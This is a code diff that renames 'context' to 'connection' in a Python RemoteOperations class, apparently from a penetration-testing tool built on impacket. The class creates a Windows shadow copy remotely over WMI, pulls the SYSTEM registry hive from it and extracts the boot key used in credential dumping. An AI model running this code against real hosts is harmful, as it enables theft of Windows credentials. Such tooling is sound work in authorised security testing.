@@ -4,15 +4,15 @@ from impacket.examples.secretsdump import LocalOperations
 
 
 class RemoteOperations:
-    def __init__(self, context, shadow_id=None):
-        self.context = context
+    def __init__(self, connection, shadow_id=None):
+        self.connection = connection
 
-        self.cimv2_namespace = self.context.get_namespace("//./root/cimv2")
+        self.cimv2_namespace = self.connection.get_namespace("//./root/cimv2")
 
         # Cached variables
         self.bootkey = None
         if shadow_id is not None:
-            self.context.logger.display(f"Using existing VSS Snapshot ID: {shadow_id}")
+            self.connection.logger.display(f"Using existing VSS Snapshot ID: {shadow_id}")
         self._shadow_id = shadow_id
         self._shadow_copy_path = None
 
@@ -23,25 +23,25 @@ class RemoteOperations:
         # If we created a Shadow Copy, delete it
         if self.shadow_copy_created:
             wmiPath = f'Win32_ShadowCopy.ID="{self.shadow_id}"'
-            self.context.logger.debug(f"Trying to delete ShadowCopy with ID {self.shadow_id}")
+            self.connection.logger.debug(f"Trying to delete ShadowCopy with ID {self.shadow_id}")
             ret = self.cimv2_namespace.DeleteInstance(wmiPath)
             if (ret.GetCallStatus(0) & 0xffffffff) != 0:
-                self.context.logger.fail(f"Could not delete ShadowCopy ID {self.shadow_id}. You will need to delete this by yourself.")
+                self.connection.logger.fail(f"Could not delete ShadowCopy ID {self.shadow_id}. You will need to delete this by yourself.")
             else:
-                self.context.logger.debug(f"ShadowCopy with ID {self.shadow_id} successfully deleted")
+                self.connection.logger.debug(f"ShadowCopy with ID {self.shadow_id} successfully deleted")
 
     def create_shadowcopy(self) -> str:
         # Creating Shadow Volumes
         shadow_id = None
         try:
             win32_shadow_copy, _ = self.cimv2_namespace.GetObject("Win32_ShadowCopy")
-            self.context.logger.debug("Trying to create SS remotely via WMI")
+            self.connection.logger.debug("Trying to create SS remotely via WMI")
             result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
             self.shadow_copy_created = True
             shadow_id = result.ShadowID
-            self.context.logger.debug(f"Shadow Copy created at ID {shadow_id}")
+            self.connection.logger.debug(f"Shadow Copy created at ID {shadow_id}")
         except Exception as e:
-            self.context.logger.debug(f"Cannot create ShadowCopy: {e}")
+            self.connection.logger.debug(f"Cannot create ShadowCopy: {e}")
         return shadow_id
 
     def get_shadowcopy_path(self, shadow_id=None) -> str:
@@ -54,9 +54,9 @@ class RemoteOperations:
             props = obj.getProperties()
             shadow_copy = {k: v["value"] for k, v in props.items()}
             device_object = shadow_copy["DeviceObject"]
-            self.context.logger.debug(f"Found ShadowCopy at {device_object}")
+            self.connection.logger.debug(f"Found ShadowCopy at {device_object}")
         except Exception as e:
-            self.context.logger.debug(f"Cannot found ShadowCopy with ID {shadow_id} :{e}")
+            self.connection.logger.debug(f"Cannot found ShadowCopy with ID {shadow_id} :{e}")
         return device_object
 
     @property
@@ -76,12 +76,12 @@ class RemoteOperations:
             return self.bootkey
 
         system_hive_path = f"{self.shadow_copy_path}\\Windows\\System32\\config\\SYSTEM"
-        system_hive_recovered = self.context.get_file_single(system_hive_path, f"{output_filename}.system")
+        system_hive_recovered = self.connection.get_file_single(system_hive_path, f"{output_filename}.system")
         if system_hive_recovered:
-            self.context.logger.debug("Got SYSTEM hive")
+            self.connection.logger.debug("Got SYSTEM hive")
             local_operations = LocalOperations(f"{output_filename}.system")
             self.bootkey = local_operations.getBootKey()
-            self.context.logger.debug(f"Got bootkey: 0x{hexlify(self.bootkey).decode('utf-8')}")
+            self.connection.logger.debug(f"Got bootkey: 0x{hexlify(self.bootkey).decode('utf-8')}")
         else:
-            self.context.logger.fail("Could not get bootkey")
+            self.connection.logger.fail("Could not get bootkey")
         return self.bootkey
